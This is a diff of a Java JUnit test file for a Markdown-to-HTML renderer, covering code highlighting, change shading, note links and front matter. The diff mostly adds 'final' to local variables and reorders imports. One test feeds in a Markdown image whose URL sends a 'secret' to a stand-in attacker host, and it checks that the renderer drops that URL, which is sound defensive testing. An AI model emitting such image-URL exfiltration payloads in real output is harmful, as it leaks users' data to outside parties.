@@ -1,10 +1,11 @@
 package dev.marregui.comando.ui.kit.text;
 
-import dev.marregui.comando.ui.kit.theme.Theme;
-import org.junit.jupiter.api.Test;
-
 import java.util.List;
 import java.util.Set;
+
+import org.junit.jupiter.api.Test;
+
+import dev.marregui.comando.ui.kit.theme.Theme;
 
 import static org.assertj.core.api.Assertions.assertThat;
 
@@ -41,7 +42,7 @@ class MarkdownHtmlTest {
     /// leaks.
     @Test
     void anImageBecomesItsAltTextAndItsUrlIsNotRendered() {
-        String html = MarkdownHtml.render("Plan ![status of <b>x</b>](https://attacker.example/p.png?d=secret) done");
+        final String html = MarkdownHtml.render("Plan ![status of <b>x</b>](https://attacker.example/p.png?d=secret) done");
         assertThat(html).doesNotContain("<img").doesNotContain("attacker.example").contains("<i>status of x</i>");
     }
 
@@ -54,7 +55,7 @@ class MarkdownHtmlTest {
     /// A Java fence renders in `pre.code` with keywords and strings in the palette's colours, its HTML escaped.
     @Test
     void aCodeBlockTakesTheEditorsColoursForItsLanguage() {
-        String html = MarkdownHtml.render("```java\nreturn \"<b>\";\n```\n");
+        final String html = MarkdownHtml.render("```java\nreturn \"<b>\";\n```\n");
         assertThat(html).contains("<pre class=\"code\"><code>")
                 .contains("<font color=\"" + Theme.hex(Theme.content().keyword) + "\">return</font>")
                 .contains("<font color=\"" + Theme.hex(Theme.content().string) + "\">\"&lt;b&gt;\"</font>")
@@ -80,18 +81,18 @@ class MarkdownHtmlTest {
     /// render as before.
     @Test
     void marksShadeTheChangedBlocksAndTheirChangedWordsAsAComparisonDoes() {
-        String md = "# Title\n\nFirst para.\n\nSecond para has words.\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |\n\n```java\nint x;\n```\n";
-        int word = md.indexOf("words");
-        MarkdownHtml.Marks marks = new MarkdownHtml.Marks(Set.of(4, 7, 11, 14), List.of(new int[] {word, word + 5}), true);
-        String html = MarkdownHtml.render(md, null, MarkdownHtml.Pictures.NONE, marks);
-        String line = "background-color: " + Theme.hex(Theme.content().added);
-        String strong = "background-color: " + Theme.hex(Theme.content().addedWord);
+        final String md = "# Title\n\nFirst para.\n\nSecond para has words.\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |\n\n```java\nint x;\n```\n";
+        final int word = md.indexOf("words");
+        final MarkdownHtml.Marks marks = new MarkdownHtml.Marks(Set.of(4, 7, 11, 14), List.of(new int[] {word, word + 5}), true);
+        final String html = MarkdownHtml.render(md, null, MarkdownHtml.Pictures.NONE, marks);
+        final String line = "background-color: " + Theme.hex(Theme.content().added);
+        final String strong = "background-color: " + Theme.hex(Theme.content().addedWord);
         assertThat(html).contains("<p style=\"" + line + "\">Second para has <span style=\"" + strong + "\">words</span>.</p>")
                 .contains("<li style=\"" + line + "\">b</li>", "<li>a</li>", "<p>First para.</p>", ">Title</h1>")
                 .contains("<td style=\"" + line + "\">1</td>", "<td style=\"" + line + "\">2</td>")
                 .contains("<pre class=\"code\" style=\"" + line + "\">");
 
-        String older = MarkdownHtml.render("Gone\n", null, MarkdownHtml.Pictures.NONE, new MarkdownHtml.Marks(Set.of(0), List.of(), false));
+        final String older = MarkdownHtml.render("Gone\n", null, MarkdownHtml.Pictures.NONE, new MarkdownHtml.Marks(Set.of(0), List.of(), false));
         assertThat(older).as("the older side in red").contains("<p style=\"background-color: " + Theme.hex(Theme.content().removed) + "\">Gone</p>");
         assertThat(MarkdownHtml.render(md, null, MarkdownHtml.Pictures.NONE, MarkdownHtml.Marks.NONE))
                 .as("no marks: as ever").isEqualTo(MarkdownHtml.render(md));
@@ -101,7 +102,7 @@ class MarkdownHtmlTest {
     /// brackets remain.
     @Test
     void webAddressesAndNoteLinksInTextAreLinks() {
-        String html = MarkdownHtml.render("See [[feedback-verification-discipline]], [[notes#setup|the setup]] and https://example.org/a.");
+        final String html = MarkdownHtml.render("See [[feedback-verification-discipline]], [[notes#setup|the setup]] and https://example.org/a.");
         assertThat(html).contains("<a href=\"comando-note:feedback-verification-discipline\">feedback-verification-discipline</a>",
                 "<a href=\"comando-note:notes#setup\">the setup</a>", "href=\"https://example.org/a\">https://example.org/a</a>.");
         assertThat(html).doesNotContain("[[");
@@ -119,7 +120,7 @@ class MarkdownHtmlTest {
     /// a rule and a setext heading.
     @Test
     void aMemoryFilesFrontMatterShowsAsItsFactsNotAHeading() {
-        String memory = """
+        final String memory = """
                 ---
                 name: reference-video-transcripts
                 description: "How to get a transcript, see [[feedback-ui-requests]]"
@@ -130,7 +131,7 @@ class MarkdownHtmlTest {
 
                 Proven 2026-10-22.
                 """;
-        String html = MarkdownHtml.render(memory);
+        final String html = MarkdownHtml.render(memory);
         assertThat(html).doesNotContain("<h2", "<hr");
         assertThat(html).contains("<td class=\"front-key\" valign=\"top\">name</td><td class=\"front-value\">reference-video-transcripts</td>",
                 "metadata.type", "<a href=\"comando-note:feedback-ui-requests\">feedback-ui-requests</a>", "<p>Proven 2026-10-22.</p>");
@@ -140,8 +141,8 @@ class MarkdownHtmlTest {
     /// A mark on a line below front matter shades that line's paragraph, so line numbers count the front matter.
     @Test
     void aComparedTextWithFrontMatterShadesTheSameLines() {
-        String text = "---\nname: x\n---\n\nfirst\n\nsecond\n";
-        String html = MarkdownHtml.render(text, null, MarkdownHtml.Pictures.NONE, new MarkdownHtml.Marks(Set.of(6), List.of(), true));
+        final String text = "---\nname: x\n---\n\nfirst\n\nsecond\n";
+        final String html = MarkdownHtml.render(text, null, MarkdownHtml.Pictures.NONE, new MarkdownHtml.Marks(Set.of(6), List.of(), true));
         assertThat(html).containsPattern("<p style=\"background-color: [^\"]+\">second</p>").contains("<p>first</p>");
     }
 }
